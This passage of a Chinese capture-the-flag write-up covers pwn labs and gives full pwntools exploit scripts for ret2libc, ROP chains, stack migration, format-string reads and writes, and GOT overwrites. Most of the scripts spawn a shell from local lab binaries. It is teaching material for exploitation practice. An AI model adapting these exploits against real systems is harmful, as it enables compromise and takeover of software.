class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'ret2lib'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./ret2lib'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(str(bin.got[<span class="string">'read'</span>]))</span><br><span class="line">cn.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">p_read = int(cn.readuntil(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">p_system = p_read - libc.symbols[<span class="string">'read'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">pbinsh = p_read - libc.symbols[<span class="string">'read'</span>] + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">cn.recvuntil(<span class="string">'for me :'</span>)</span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x38</span> + <span class="string">'bbbb'</span></span><br><span class="line">pay += p32(p_system) + <span class="string">'bbbb'</span> + p32(pbinsh)</span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h2><p>simple rop,也不多解释了</p>
+<p>两种版本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line">bin = ELF(<span class="string">'simplerop'</span>)</span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./simplerop'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">p_read = <span class="number">0x0806CD50</span></span><br><span class="line">p_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">p_edx_ecx_ebx_ret = <span class="number">0x0806e850</span></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line">p += <span class="string">'a'</span>*<span class="number">0x1c</span> + <span class="string">'bbbb'</span></span><br><span class="line">p += p32(p_read) + p32(p_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(bin.bss()) + p32(<span class="number">0x10</span>)</span><br><span class="line">p += p32(p_edx_ecx_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin.bss())</span><br><span class="line">p += p32(p_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">p += p32(int_80)</span><br><span class="line"><span class="keyword">print</span> hex(len(p))</span><br><span class="line"></span><br><span class="line">cn.sendline(p)</span><br><span class="line">cn.sendline(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"10.211.55.28"</span></span><br><span class="line">port = <span class="number">8888</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./simplerop'</span>)</span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x809a15d</span> <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">pop_eax_ret = <span class="number">0x80bae06</span></span><br><span class="line">pop_edx_ret = <span class="number">0x806e82a</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806e850</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">buf = <span class="number">0x80ea060</span></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write to memory</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">32</span></span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += <span class="string">"/bin"</span></span><br><span class="line">payload += p32(gadget)</span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(buf+<span class="number">4</span>)</span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += <span class="string">"/sh\x00"</span></span><br><span class="line">payload += p32(gadget)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write to register</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(int_80)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h2><p>栈迁移的技巧，这个栈迁移还是比较松的，不过他做了一点限制，main函数不能回来用第二次。</p>
+<p>栈迁移的理解建议借助纸笔画图来辅助理解，另外就是leave的含义是mov sp,bp; pop bp。一定要清楚。</p>
+<p>栈迁移是再写入空间不够的时候，通过leave_ret这类收尾的代码来把ebp和esp改到某个地址固定的位置，通过控制ret的地址和ebp指针向我们指定的位置写值，通常是一段不完整的rop代码，通过不断迁移把rop代码一段一段的写完，最后通过leave_ret到rop代码上面4字节（x86）来实现rop的调用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">bin = ELF(<span class="string">'migration'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line"></span><br><span class="line">buf = bin.bss() + <span class="number">0x700</span></span><br><span class="line">buf2 = bin.bss() + <span class="number">0x600</span></span><br><span class="line">p3ret = <span class="number">0x08048569</span></span><br><span class="line">p1ret = <span class="number">0x0804836d</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./migration'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(buf)</span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">cn.send(pay)</span><br><span class="line"></span><br><span class="line">pay = p32(buf2)</span><br><span class="line">pay += p32(bin.plt[<span class="string">'puts'</span>]) + p32(p1ret) + p32(bin.got[<span class="string">'puts'</span>])</span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">cn.send(pay)</span><br><span class="line"></span><br><span class="line">puts = u32(cn.recv()[:<span class="number">4</span>])</span><br><span class="line">system = puts - libc.symbols[<span class="string">'puts'</span>] + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">pay = p32(buf)</span><br><span class="line">pay += p32(bin.plt[<span class="string">'read'</span>]) + p32(p3ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">pay += p32(system) + <span class="string">'bbbb'</span> + p32(buf)</span><br><span class="line"></span><br><span class="line">cn.send(pay)</span><br><span class="line"></span><br><span class="line">cn.send(<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="lab7"><a href="#lab7" class="headerlink" title="lab7"></a>lab7</h2><p>考察利用格式化字符串漏洞得到任意地址写或任意地址读。</p>
+<p>任意地址写：通过printf把password改成其他已知值，然后发送已知的password即拿flag。</p>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./crack'</span>)</span><br><span class="line"></span><br><span class="line">p_pwd = <span class="number">0x0804A048</span></span><br><span class="line">fmt_len = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">pay = fmtstr_payload(fmt_len,&#123;p_pwd:<span class="number">1</span>&#125;)</span><br><span class="line">cn.sendline(pay)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">cn.recv()</span><br><span class="line">cn.recv()</span><br></pre></td></tr></table></figure></p>
+<p>任意地址读：直接读出password的值，然后发送。</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">r = process(<span class="string">'./crack'</span>)</span><br><span class="line"></span><br><span class="line">password_addr = <span class="number">0x804a048</span></span><br><span class="line">r.recvuntil(<span class="string">"?"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(p32(password_addr) + <span class="string">"#"</span> + <span class="string">"%10$s"</span> + <span class="string">"#"</span> )</span><br><span class="line">r.recvuntil(<span class="string">"#"</span>)</span><br><span class="line">p = r.recvuntil(<span class="string">"#"</span>)</span><br><span class="line">password = struct.unpack(<span class="string">'i'</span>,p[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(str(password))</span><br><span class="line">r.recv()</span><br><span class="line">r.recv()</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="lab8"><a href="#lab8" class="headerlink" title="lab8"></a>lab8</h2><p>这道也是考察格式化字符串的任意地址写，就不多说了</p>
+<p><strong>方法一</strong>，直接覆盖magic：<br>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p_magic = <span class="number">0x0804A038</span></span><br><span class="line">fmt_len = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./craxme'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">pay = fmtstr_payload(fmt_len,&#123;p_magic:<span class="number">0xfaceb00c</span>&#125;)</span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">'./craxme'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">pay = fmtstr_payload(fmt_len,&#123;p_magic:<span class="number">0xda</span>&#125;)</span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.recvuntil(<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure></p>
+<p><strong>方法二</strong>，篡改GOT表：<br>把puts改到main中read的上面，printf改成system的plt表地址。<br>这样就可以拿到shell了。<br>exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">fmt_len = 7</span><br><span class="line"></span><br><span class="line">cn = process(&apos;./craxme&apos;)</span><br><span class="line">bin = ELF(&apos;./craxme&apos;)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line">pay = fmtstr_payload(fmt_len,&#123;bin.got[&apos;puts&apos;]:0x0804858B,bin.got[&apos;printf&apos;]:bin.plt[&apos;system&apos;]&#125;)</span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="lab9"><a href="#lab9" class="headerlink" title="lab9"></a>lab9</h2><p>这题和前几题相比还是有点难度的，难度是由与他read进来的数据不放在栈上，而是放在bss段上，之前用格式化字符串的%x,%s,%n之类的都是指栈上向后数第n个变量。</p>
+<p>原本我们输入的数据在栈上，所以栈上的部分数据是我们控制的，%x,%s,%n就是我们所控制的值。</p>
+<p>但现在在bss段上，栈上没有我们输入的数据就不能通过上面的那种方法了。</p>
+<p>通过栈上指向栈另一处的指针，比如保存的ebp。通过%n和保存的ebp，我们就能想保存的ebp所指向的地址（栈上的另一处，前ebp）处写任意值，这样我们在栈上就有了一个任意构造的指针，通过这个任意指针我们就可以任意地址读和任意地址写。</p>
+<p>看一下在即将printf时的栈布局：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ esp  0xffffd2f0 —▸ 0x804a060 (buf) ◂— 0xa /* &apos;\n&apos; */</span><br><span class="line">01:0004│      0xffffd2f4 —▸ 0x8048640 ◂— jno    0x80486b7 /* &apos;quit&apos; */</span><br><span class="line">02:0008│      0xffffd2f8 ◂— 0x4</span><br><span class="line">03:000c│      0xffffd2fc —▸ 0x804857c (play+51) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd300 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d</span><br><span class="line">05:0014│      0xffffd304 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">06:0018│ ebp  0xffffd308 —▸ 0xffffd318 —▸ 0xffffd328 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd30c —▸ 0x8048584 (play+59) ◂— nop    </span><br><span class="line">08:0020│      0xffffd310 —▸ 0xf7fb3d60 (_IO_2_1_stdout_) ◂— 0xfbad2887</span><br><span class="line">09:0024│      0xffffd314 ◂— 0x0</span><br><span class="line">0a:0028│      0xffffd318 —▸ 0xffffd328 ◂— 0x0</span><br><span class="line">0b:002c│      0xffffd31c —▸ 0x80485b1 (main+42) ◂— nop    </span><br><span class="line">0c:0030│      0xffffd320 —▸ 0xf7fb33dc (__exit_funcs) —▸ 0xf7fb41e0 (initial) ◂— 0x0</span><br><span class="line">0d:0034│      0xffffd324 —▸ 0xffffd340 ◂— 0x1</span><br><span class="line">0e:0038│      0xffffd328 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd32c —▸ 0xf7e19637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line">10:0040│      0xffffd330 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">... ↓</span><br><span class="line">12:0048│      0xffffd338 ◂— 0x0</span><br><span class="line">13:004c│      0xffffd33c —▸ 0xf7e19637 (__libc_start_main+247) ◂— add    esp, 0x10</span><br><span class="line">14:0050│      0xffffd340 ◂— 0x1</span><br><span class="line">15:0054│      0xffffd344 —▸ 0xffffd3d4 —▸ 0xffffd5ea ◂— 0x6d6f682f (&apos;/hom&apos;)</span><br><span class="line">16:0058│      0xffffd348 —▸ 0xffffd3dc —▸ 0xffffd61d ◂— 0x54554c43 (&apos;CLUT&apos;)</span><br><span class="line">17:005c│      0xffffd34c ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1a:0068│      0xffffd358 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line">1b:006c│      0xffffd35c —▸ 0xf7ffdc04 ◂— 0x0</span><br><span class="line">1c:0070│      0xffffd360 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f3c</span><br><span class="line">1d:0074│      0xffffd364 ◂— 0x0</span><br></pre></td></tr></table></figure>
+<p>其中我们用到了下面四行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">06:0018│ ebp  0xffffd308 —▸ 0xffffd318 —▸ 0xffffd328 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd30c —▸ 0x8048584 (play+59) ◂— nop    </span><br><span class="line">...</span><br><span class="line">0a:0028│      0xffffd318 —▸ 0xffffd328 ◂— 0x0</span><br><span class="line">0b:002c│      0xffffd31c —▸ 0x80485b1 (main+42) ◂— nop</span><br></pre></td></tr></table></figure></p>
+<p>分别是p_ebp1，p_7，p_ebp2，p_11。</p>
+<p>大致流程：<br>通过p_ebp1改p_ebp2的值为p_7的地址；<br>通过p_ebp2改p_7的值为printf在got表的地址；</p>
+<p>通过p_ebp1改p_ebp2的值为p_11的地址；<br>通过p_ebp2改p_11的值为printf在got表的地址+2；</p>
+<p>通过p_7 leak出printf的libc地址；<br>算出system地址；</p>
+<p>通过p_7和p_11两字节两字节的把printf改成system；</p>
+<p>发送/bin/sh拿shell。</p>
+<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">p_printf = <span class="number">0x0804A010</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'libc.so'</span>)</span><br><span class="line">cn = process(<span class="string">'./playfmt'</span>)</span><br><span class="line"></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">'%6$x'</span></span><br><span class="line">cn.sendline(pay)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p_ebp2 = int(cn.recv(),<span class="number">16</span>)<span class="comment">#10</span></span><br><span class="line">p_7 = p_ebp2<span class="number">-0xc</span><span class="comment">#7</span></span><br><span class="line">p_11 = p_ebp2+<span class="number">4</span><span class="comment">#11</span></span><br><span class="line">p_ebp1 = p_ebp2<span class="number">-0x10</span><span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">"%"</span>+str(p_7&amp;<span class="number">0xffff</span>)+<span class="string">"c%6$hn\x00"</span></span><br><span class="line">cn.sendline(pay)<span class="comment">#set p_ebp2-&gt;p_7</span></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"%"</span>+str(p_printf&amp;<span class="number">0xffff</span>)+<span class="string">"c%10$hn\x00"</span></span><br><span class="line">cn.sendline(pay)<span class="comment">#set p_7-&gt;p_printf</span></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	cn.send(<span class="string">"here\x00"</span>)</span><br><span class="line">	sleep(<span class="number">0.3</span>)</span><br><span class="line">	data = cn.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">"here"</span>) != <span class="number">-1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">"%"</span>+str(p_11&amp;<span class="number">0xffff</span>)+<span class="string">"c%6$hn\x00"</span></span><br><span class="line">cn.sendline(pay)<span class="comment">#set p_ebp2-&gt;p_11</span></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"%"</span>+str((p_printf+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">"c%10$hn\x00"</span></span><br><span class="line">cn.sendline(pay)<span class="comment">#set p_11-&gt;p_printf+2</span></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'here\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	cn.send(<span class="string">"here\x00"</span>)</span><br><span class="line">	sleep(<span class="number">0.3</span>)</span><br><span class="line">	data = cn.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">"here"</span>) != <span class="number">-1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">"aaaa%7$s\x00"</span></span><br><span class="line">cn.sendline(pay)</span><br><span class="line">cn.recvuntil(<span class="string">'aaaa'</span>)</span><br><span class="line">printf = u32(cn.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(printf)<span class="comment">#leak printf</span></span><br><span class="line"></span><br><span class="line">system = printf-libc.symbols[<span class="string">'printf'</span>]+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(system)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">"%"</span>+str(system&amp;<span class="number">0xffff</span>)+<span class="string">"c%7$hn"</span> </span><br><span class="line">pay += <span class="string">"%"</span>+str((system&gt;&gt;<span class="number">16</span>) - (system&amp;<span class="number">0xffff</span>))+<span class="string">"c%11$hn\x00"</span></span><br><span class="line">cn.sendline(pay)<span class="comment">#hijack printf-&gt;system</span></span><br><span class="line">cn.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	cn.send(<span class="string">"here\x00"</span>)</span><br><span class="line">	sleep(<span class="number">0.3</span>)</span><br><span class="line">	data = cn.recv()</span><br><span class="line">	<span class="keyword">if</span> data.find(<span class="string">"here"</span>) != <span class="number">-1</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>ps.通过修改保存的ebp的值，经过两次return之后，esp应该会被修改成我们所改的值，若在bss上写入rop代码，然后控制esp到bss，应该也是可以拿到shell的。</p>
+<hr>
+<h2 id="lab10"><a href="#lab10" class="headerlink" title="lab10"></a>lab10</h2><p>UAF的题目的利用方法是F，A，U（先FREE,再修改chunk，调用chunk中的函数指针）。让两个指针实际指向同一个chunk，一个指针把内存解释为字符串，从而写入任意值，另一个指针把内存解释为函数指针。从而控制了EIP。</p>
+<p>这题首先是为了题目需要，在struct中存了一个函数指针。</p>
